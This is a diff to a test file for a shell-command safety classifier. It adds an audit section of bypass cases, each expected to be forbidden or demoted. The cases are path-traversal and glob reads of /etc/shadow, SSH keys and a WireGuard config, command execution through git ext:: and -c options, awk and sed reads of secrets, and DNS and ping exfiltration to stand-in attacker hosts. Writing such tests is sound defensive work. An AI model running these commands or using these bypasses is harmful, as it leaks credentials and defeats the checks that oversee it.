@@ -24,7 +24,7 @@ beforeAll(() => {
   // compares realpaths against the trusted list, so the fixture must be a realpath too.
   binDir = realpathSync(mkdtempSync(join(tmpdir(), "classify-bin-")));
   untrustedDir = realpathSync(mkdtempSync(join(tmpdir(), "classify-untrusted-")));
-  for (const n of ["ls", "cat", "rm", "ip", "docker", "systemctl", "grep", "rg", "find", "sed", "curl", "git", "apt", "dig", "ss", "tail", "python3", "bash", "sqlite3", "tee", "dd", "echo", "jq", "env", "sudo", "xargs", "nsenter", "busybox", "nice", "timeout", "tcpdump", "iptables", "nft", "ufw", "passwd", "kill", "pkill", "truncate", "cp", "mv", "tar", "rsync", "crontab", "chmod", "chown", "sleep", "yes", "watch", "wget", "perl", "node", "awk", "stat", "df", "journalctl", "nmcli", "apt-get", "dpkg", "mount", "umount", "sysctl", "pip", "ln", "mkdir", "touch", "wg", "ssh", "npm", "printenv", "top", "less", "apt-cache", "wc", "nc", "flock", "runuser", "taskset", "chrt", "unshare", "script", "setpriv", "systemd-run", "at", "batch"]) {
+  for (const n of ["ls", "cat", "rm", "ip", "docker", "systemctl", "grep", "rg", "find", "sed", "curl", "git", "apt", "dig", "ss", "tail", "python3", "bash", "sqlite3", "tee", "dd", "echo", "jq", "env", "sudo", "xargs", "nsenter", "busybox", "nice", "timeout", "tcpdump", "iptables", "nft", "ufw", "passwd", "kill", "pkill", "truncate", "cp", "mv", "tar", "rsync", "crontab", "chmod", "chown", "sleep", "yes", "watch", "wget", "perl", "node", "awk", "stat", "df", "journalctl", "nmcli", "apt-get", "dpkg", "mount", "umount", "sysctl", "pip", "ln", "mkdir", "touch", "wg", "ssh", "npm", "printenv", "top", "less", "apt-cache", "wc", "nc", "flock", "runuser", "taskset", "chrt", "unshare", "script", "setpriv", "systemd-run", "at", "batch", "base64", "strings", "head", "nslookup", "ping", "host", "getent", "mtr", "traceroute"]) {
     fakeExecutable(binDir, n);
   }
   // A symlink named `ls` that is really `rm` — the PATH-shadow bypass.
@@ -103,7 +103,7 @@ describe("read", () => {
       "ip addr",
       "ip link",
       "ss -tlnp",
-      "dig +short example.com",
+      "dig +short nas.local",
       "docker ps -a",
       "docker inspect jellyfin",
       "docker logs --tail 100 jellyfin",
@@ -479,6 +479,62 @@ describe("tree-walking readers rooted where secrets live (root sandbox review)",
       "tar tzf /tmp/x.tgz",
       "grep -r x /var/lib/docker",
     ]);
+  });
+});
+
+describe("audit 2026-09-02 — classifier secret-leak bypasses (each verified live)", () => {
+  test("C1: relative and ..-traversal path tokens resolve and are forbidden", () => {
+    expectAll("forbidden", [
+      "cat ../../../../etc/shadow",
+      "base64 ../../../../../../var/lib/miro/miro.db",
+      "cat foo/../../../../etc/shadow",
+      "strings ../../../../etc/wireguard/wg0.conf",
+      "cat ../../root/.ssh/id_rsa",
+      "head -n1 ../../../etc/gshadow",
+    ]);
+  });
+  test("C1: an ordinary relative read is still a read", () => {
+    expectAll("read", ["cat ./README.md", "cat ../src/index.ts", "head -n5 ./logs/app.log"]);
+  });
+  test("C2: a glob that could expand into secret material is forbidden", () => {
+    expectAll("forbidden", [
+      "cat /etc/shado?",
+      "base64 /etc/gshad*",
+      "cat /etc/sh*w",
+      "cat /home/miro/.ss?/id_rsa",
+      "base64 /root/.ss*/id_rsa",
+    ]);
+  });
+  test("C2: a glob under a non-secret directory is still a read", () => {
+    expectAll("read", ["ls /var/log/*.log", "cat /srv/media/*.txt", "ls /tmp/foo*"]);
+  });
+  test("C3: git ext:: transport and exec-bearing -c are forbidden", () => {
+    expectAll("forbidden", [
+      "git ls-remote ext::sh -c whoami",
+      "git -c diff.external=cat log -p --ext-diff",
+      "git -c core.sshCommand=id fetch origin",
+      "git -c alias.x=!sh x",
+    ]);
+  });
+  test("C3: an ordinary git read is still a read", () => {
+    expectAll("read", ["git log --oneline -n5", "git -c color.ui=always status", "git diff HEAD~1"]);
+  });
+  test("C4: awk getline and sed r reading a secret file are forbidden", () => {
+    expectAll("forbidden", [
+      "awk 'BEGIN{while((getline l < \"/etc/shadow\")>0) print l}'",
+      "sed 'r /etc/shadow' /dev/null",
+      "awk '{print}' /etc/shadow",
+    ]);
+  });
+  test("C5: a network probe to a public host demotes to mutate; a LAN target stays read", () => {
+    expectAll("mutate", [
+      "dig secret-data.evil.example.com",
+      "dig @8.8.8.8 x.evil.com",
+      "nslookup exfil.attacker.net",
+      "ping -c1 -p deadbeef 203.0.113.9",
+      "nc -z 203.0.113.9 443",
+    ]);
+    expectAll("read", ["dig myserver", "dig 192.168.1.1", "ping -c1 10.0.0.5", "nslookup nas.local"]);
   });
 });
 
